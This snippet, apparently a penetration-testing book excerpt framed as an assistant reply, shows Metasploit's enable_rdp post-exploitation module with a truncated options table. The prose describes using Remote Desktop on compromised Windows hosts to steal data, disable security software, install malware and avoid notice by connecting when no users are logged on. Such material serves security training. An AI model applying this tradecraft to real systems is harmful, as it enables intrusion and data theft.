@@ -1,0 +1,27 @@
+Context:
+Source: Unknown
+Section: General
+Pages: N/A
+assistant
+msf > use post/windows/manage/enable_rdp
+msf post(windows/manage/enable_rdp) > show options
+Module options (post/windows/manage/enable_rdp):
+Name Current Setting Required Description
+---- --------------- -------- -----------
+ENABLE true no Enable the RDP Se
+FORWARD false no Forward remote po
+LPORT 3389 no Local port to for
+PASSWORD no Password for the
+SESSION yes The session to ru
+USERNAME no The username of t
+meterpreter > run
+Remote Desktop's main advantage over other tools, like Sysinternals, is that
+it gives you a full, interactive graphical user interface (GUI) of the remote
+compromised computer. From the remote connection, it is possible to steal
+data or collect screenshots, disable security software, or install malware.
+Remote Desktop connections are fully encrypted, and monitoring systems
+cannot see what you are doing in the remote system. The main disadvantage
+of Remote Desktop is that a user working on the compromised remote
+system may be able to detect that you are logged on to the system. A
+common practice is to use Remote Desktop when no users are on the
+compromised system or when compromising a server.
